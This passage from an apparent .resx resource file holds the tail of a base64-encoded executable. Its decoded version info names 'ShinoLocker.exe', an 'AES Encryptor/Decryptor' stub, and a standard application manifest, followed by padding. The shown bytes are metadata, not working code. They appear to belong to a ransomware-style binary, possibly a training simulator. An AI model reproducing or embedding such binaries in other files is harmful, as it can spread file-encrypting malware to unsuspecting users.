        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAEAAAACAAAIAYAAAAUAAAgAAAAAAAAAAAAAAAAAAAAQABAAAA
        OAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAQABAAAAaAAAgAAAAAAAAAAA
        AAAAAAAAAQAAAAAAMAQAAJBgAACgAwAAAAAAAAAAAACgAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8A
        SQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAQAAAAAAAAAAAAAA
        AAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkA
        bwBuAAAAAAAAALAEAAMAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAA3AIAAAEAMAAwADAA
        MAAwADQAYgAwAAAASAAYAAEAQwBvAG0AbQBlAG4AdABzAAAAQQBFAFMAIABFAG4AYwByAHkAcAB0AG8A
        cgAvAEQAZQBjAHIAeQBwAHQAbwByAAAAMAAIAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABTAGgA
        MQBuADAAZwAxAAAASAAQAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAFMAaABpAG4A
        bwBMAG8AYwBrAGUAcgBTAHQAdQBiAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4A
        MAAuADAALgAwAAAAQAAQAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABTAGgAaQBuAG8ATABvAGMA
        awBlAHIALgBlAHgAZQAAAFYAGQABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkA
        cgBpAGcAaAB0ACAAqQAgAFMAaABpAG4AbwBTAGUAYwAgAEkAbgBjAAAAAABIABAAAQBMAGUAZwBhAGwA
        VAByAGEAZABlAG0AYQByAGsAcwAAAAAAUwBoAGkAbgBvAEwAbwBjAGsAZQByAFMAdAB1AGIAAABIABAA
        AQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAUwBoAGkAbgBvAEwAbwBjAGsAZQByAC4A
        ZQB4AGUAAABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAFMAaABpAG4AbwBMAG8AYwBrAGUA
        cgBTAHQAdQBiAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4A
        MAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAA
        QGQAAFsCAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8
        YXNzZW1ibHkgbWFuaWZlc3RWZXJzaW9uPSIxLjAiIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQt
        Y29tOmFzbS52MSI+DQogIDxhc3NlbWJseUlkZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15
        QXBwbGljYXRpb24uYXBwIi8+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29m
        dC1jb206YXNtLnYyIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4
        bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8cmVxdWVzdGVk
        RXhlY3V0aW9uTGV2ZWwgbGV2ZWw9ImFzSW52b2tlciIgdWlBY2Nlc3M9ImZhbHNlIiAvPg0KICAgICAg
        PC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KICA8
        Y29tcGF0aWJpbGl0eSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTpjb21wYXRpYmlsaXR5
        LnYxIj4NCiAgICA8YXBwbGljYXRpb24+DQogICAgPC9hcHBsaWNhdGlvbj4NCiAgPC9jb21wYXRpYmls
        aXR5Pg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAABAAAAMAAAARDIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</value>
  </data>
</root>